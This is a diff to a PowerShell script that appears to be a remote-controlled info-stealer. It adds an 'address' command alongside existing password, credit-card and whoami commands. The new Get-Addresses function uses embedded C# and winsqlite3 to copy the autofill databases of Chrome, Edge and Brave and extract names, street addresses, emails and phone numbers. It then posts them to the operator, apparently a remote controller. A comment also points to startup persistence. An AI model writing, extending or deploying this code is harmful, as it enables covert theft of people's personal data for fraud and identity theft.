@@ -432,6 +432,7 @@ function Run-Cmd($c){
         }
     elseif($c -eq 'passwords'){ Get-Passwords }
     elseif($c -eq 'creditcard'){ Get-CreditCards }
+    elseif($c -eq 'address'){ Get-Addresses }
     elseif($c -eq 'whoami'){ Post (whoami) }
     else { Post "`[?] unknown: $c" }
   }catch{}
@@ -662,6 +663,94 @@ function Get-CreditCards {
   }
   if ($hits.Count -eq 0) { Post '[creditcards] none'; return }
   Post ("`[creditcards] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
+}
+
+
+
+function Get-Addresses {
+  if (-not ('AddrGrab' -as [type])) {
+    Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Collections.Generic;
+public class AddrGrab {
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_open(byte[] f, out IntPtr db);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_close(IntPtr db);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_prepare_v2(IntPtr db, byte[] sql, int nByte, out IntPtr stmt, IntPtr tail);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_step(IntPtr stmt);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_finalize(IntPtr stmt);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern IntPtr sqlite3_column_text(IntPtr stmt, int c);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_column_bytes(IntPtr stmt, int c);
+    static string T(IntPtr p, int n) { if (p == IntPtr.Zero || n <= 0) return ""; byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n); return Encoding.UTF8.GetString(b); }
+    static byte[] E(string s) { return Encoding.UTF8.GetBytes(s); }
+    public static List<string[]> Flat(string db) {
+        var rows = new List<string[]>();
+        IntPtr hdb, stmt;
+        if (sqlite3_open(E(db), out hdb) != 0) return rows;
+        if (sqlite3_prepare_v2(hdb, E("SELECT name,value FROM autofill"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
+        while (sqlite3_step(stmt) == 100) {
+            string n = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
+            string v = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
+            rows.Add(new string[] { n, v });
+        }
+        sqlite3_finalize(stmt); sqlite3_close(hdb);
+        return rows;
+    }
+    public static List<string[]> Profiles(string db) {
+        var rows = new List<string[]>();
+        IntPtr hdb, stmt;
+        if (sqlite3_open(E(db), out hdb) != 0) return rows;
+        if (sqlite3_prepare_v2(hdb, E("SELECT p.street_address,p.city,p.state,p.zipcode,p.country_code,n.full_name FROM autofill_profiles p LEFT JOIN autofill_profile_names n ON n.guid=p.guid"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
+        while (sqlite3_step(stmt) == 100) {
+            string street = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
+            string city = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
+            string state = T(sqlite3_column_text(stmt, 2), sqlite3_column_bytes(stmt, 2));
+            string zip = T(sqlite3_column_text(stmt, 3), sqlite3_column_bytes(stmt, 3));
+            string country = T(sqlite3_column_text(stmt, 4), sqlite3_column_bytes(stmt, 4));
+            string name = T(sqlite3_column_text(stmt, 5), sqlite3_column_bytes(stmt, 5));
+            rows.Add(new string[] { name, street, city, state, zip, country });
+        }
+        sqlite3_finalize(stmt); sqlite3_close(hdb);
+        return rows;
+    }
+}
+'@
+  }
+  $hits = New-Object System.Collections.ArrayList
+  $targets = @(
+    @{ n = 'Chrome'; b = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
+    @{ n = 'Edge';   b = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
+    @{ n = 'Brave';  b = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
+  )
+  foreach ($t in $targets) {
+    $wd = Join-Path $t.b 'Default\Web Data'
+    if (-not (Test-Path $wd)) { continue }
+    $tmp = Join-Path $env:TEMP ('wd_' + [Guid]::NewGuid().ToString('N') + '.db')
+    Copy-Item $wd $tmp -Force -EA SilentlyContinue
+    # standard profiles (Chrome/Brave): full address
+    foreach ($r in [AddrGrab]::Profiles($tmp)) {
+      if (($r -join '') -ne '') { [void]$hits.Add(($t.n + '|' + ($r -join '|'))) }
+    }
+    # flat autofill (Edge + old): name/email/phone/postal/country
+    $first=''; $last=''; $email=''; $phone=''; $postal=''
+    foreach ($r in [AddrGrab]::Flat($tmp)) {
+      switch ($r[0]) {
+        'FirstName' { $first = $r[1] }
+        'LastName'  { $last  = $r[1] }
+        'Email'     { $email = $r[1] }
+        'Phone'     { $phone = $r[1] }
+      }
+      if ($r[0] -like ':r3:*') { $postal = $r[1] }
+    }
+    Remove-Item $tmp -Force -EA SilentlyContinue
+    $line = @($first, $last, $email, $phone, $postal)
+    if (($line -ne $null -and ($line | Where-Object { $_ }) -join '') -ne '') {
+      [void]$hits.Add(($t.n + '|name=' + ($first + ' ' + $last).Trim() + '|email=' + $email + '|phone=' + $phone + '|postal=' + $postal))
+    }
+  }
+  if ($hits.Count -eq 0) { Post '[addresses] none'; return }
+  Post ("`[addresses] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
 }
 
 # ---- startup: persist + boot notify ----
